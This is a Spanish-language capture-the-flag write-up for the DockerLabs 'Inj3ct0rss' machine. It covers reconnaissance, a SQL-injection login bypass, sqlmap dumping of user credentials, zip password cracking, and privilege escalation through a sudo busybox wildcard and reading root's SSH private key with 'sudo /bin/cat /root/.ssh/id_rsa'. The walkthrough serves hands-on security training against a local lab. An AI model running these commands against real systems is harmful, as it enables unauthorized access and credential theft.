# MACHINE INJ3CT0RSS 

## INFORMACIÓN GENERAL

- **Plataforma**: DockerLabs
- **Sistema Operativo**: Linux
- **Dificultad**: Medio

![machine_dockerlabs](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/machine_dockerlabs.png)

## DESPLIEGUE

```python
bash autodeploy.sh inj3ct0rss.tar
```

## RECONOCIMIENTO
```python
nmap -p- -sCV -sS --min-rate 5000 -vvvv -n -Pn 172.17.0.2
```
```ruby
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000080s latency).
Scanned at 2025-03-06 15:53:54 -05 for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fd:f8:90:30:73:b2:51:20:2d:cb:7a:77:67:69:dc:e5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBExyKJmqP02QSpyCbDMVK8cvWcsJmAHf2WEyjBSElOMDSrdK7mawGufQtAKuf6aCZGWjM8HtOa++iu47gY/224g=
|   256 ad:54:3f:1a:45:7c:b5:97:fb:5b:a8:fb:63:1d:1d:0b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAxCKvhvk5MXJSo9kabqvQHsuRDOnSE0M+Z6El2r9+4X
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Inj3ct0rs CTF - P\xC3\xA1gina Principal
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Tenemos el puerto 80 abierto, hay un Servicio Web alojado, podemos ir ver con que nos encontramos 
![web80](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/web80.png)
Vemos como ya nos está dando un poco de informacion sobre el CTF, vamos a enumerar directorios a ver si nos encuentra algo interesante a parte del login y el register que muestra la web

## ENUMERACIÓN
```python
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml,csv,txt,html -t 20 -b 500,502,404
```
```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,500,502
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php,xml,csv
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/login.php            (Status: 200) [Size: 1039]
/register.php         (Status: 200) [Size: 1053]
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 4025]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
```
# EXPLOTACIÓN
Vemos que no tenemos mucha informacion sobre directorios por detras, entonces como nos dice que SQLi es unas de las caracteristicas del CTF, vamos a probar si funciona en
el inicio de sesion

![sqli](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/sqli.png)
![sqlilogin](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/sqlilogin.png)

Nos ha iniciado sesión mediante SQLi eso indica que es vulnerable, para cerciorarse quize hacer las inyecciones interceptando el trafico con Burpsuite, pero cuando tratamos de inyectar comandos
o intentar logearse BurpSuite nos muestra un codigo de estado 302 -> Found, y no nos envia a `welcome.php`, al parecer esta redireccionando a una pagina que puede indicar un inicio de sesion 
exitoso o erroneo asi este con URL Encode

![burpsuite_prueba](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/burpsuite_prueba.png)

Entonces vamos a guardar la request para poder enumerarlo con `SQLMap` 

![request](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/request.png)

### ENUMERACIÓN CON SQLMAP 
1. ENUMERACION DE BASES DE DATOS
```ruby
sqlmap -r req --dbs --batch
```
![enumeracion_bd](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/enumeracion_bd.png)
Vemos que nos enumera todas las bases de datos, pero la que mas causa curiosidad es `injectors_db`

2. ENUMERACIÓN DE TABLAS DE LA BD `injectors_db`
```ruby
sqlmap -r req -D injectors_db --tables
```
![enumeracion_tables](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/enumeracion_tables.png)

Solo existe una tabla de nombre `users` vamos a seguir enumerando, ahora columnas

3. ENUMERACIÓN DE COLUMNAS DE LA TABLA `users`
```ruby
sqlmap -r req -D injectors_db -T users --columns
```
![enumeracion_columns](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/enumeracion_columns.png)

4. Tenemos los nombres de las columna, interesante `username`, `password`, seguiremos enumerando
```ruby
sqlmap -r req -D injectors_db -T users -C password,username --dump
```
![user_password](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/user_password.png)

Vemos que temos credenciales, probamos por SSH y no tenemos resultado, pero hay una password sospechosa que dice `no_mirar_en_eeste_directorio`, pero como somos hackers
y no le tenemos miedo a nada, vamos a mirarlo :V 

![comprimido_zip](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/comprimido_zip.png)

Tenemos un comprimido de nombre `secret.zip`, vamos a descargarlo a ver si podemos descomprimirlo 
```ruby
wget 172.17.0.2/no_mirar_en_este_directorio/secret.zip
```
Una vez descargado el `.zip`. podemos ver algunos metadatos, muchas vece evidencia informacion importante
```python
exiftool secret.zip
```
![exiftool](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/exiftool.png)

Vemos que dentro del `.zip` existe un archvito llamado `confidencial.txt` que nos llama la atencion, vamos a intentar descomprimirlo

```python
unzip secret.zip
```
Esta protegido con una password, entonces vamos a crackearlo con el siguiente comando
```python
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt secret.zip
```
- **fcrackzip**: Herramienta utilizada para romper contraseñas de archivos .zip,ataques mediante fuera bruta y diccionario
- **-v**: Muestra información detallada del progreso.
- **-u**: Verifica si la contraseña es correcta al intentar descomprimir el archivo.
- **-D**: Usa un ataque de diccionario, probando contraseñas desde un archivo de texto.
- **-p** /path/to/wordlist.txt: Especifica el archivo de diccionario con las posibles contraseñas.

OJO: Se puede crackear tambien con JohnTheRipper, extrayendo el hash del .zip y luego aplicar el ataque de fuerza bruta con el diccionario de rockyou.txt

![fcrackzip](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/fcrackzip.png)

ahora si podemos comprimir con éxito y podemos observar credenciales del usuario `ralf`
![ralf](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/credential_ralf.png)

Vamos a logearse por SSH con las credenciales que acabamos de encontrar
```python
ssh ralf@172.17.0.2
```
![hash_ralf](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/hash_ralf.png)

Vemos que tenemos un hash MD5 que esta en el archivo user.txt pero no podemos descubrir su contenido en texto claro

# ESCALADA DE PRIVILEGIOS 
Si hacemos `sudo -l` vemos que el usuario capa puede hacer uso de un binario que se llama `busybox`, vamos a [GTFObins](https://gtfobins.github.io/)
OJO: Pero solo con el contenido de un directorio de nombre /nothing/*

![busybox](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/busybox.png)

Como existe un wildcard podemos escapar asi como se muestra en la siguiente captura:
![wildcard](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/wildcard.png)

como el usuario capa podemos escalar privilegios mediante el binario cat 
![capa_cat](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/capa_cat.png)

Vamos a aprovecharnos de la Private Key del usuario Root ya que tenemos la capacidad de leerlo
```ruby
sudo /bin/cat /root/.ssh/id_rsa
```
Copiamos y pegamos en un archivo que crearemos en nuestra maquina local atacante, y le damos permisos 
```python
chmod 600 keyroot
```
una vez hecho todo eso probamos logearse con la clave privada de root 
![root](https://github.com/Jean25-sys/CTFs_Wintxx./blob/main/Writeups/dockerlabs/images/inj3ct0rss/root.png)


# HEMOS RESUELTO LA MAQUINA


## ELIMINAR MAQUINA
```ruby
ctrl + c 
```




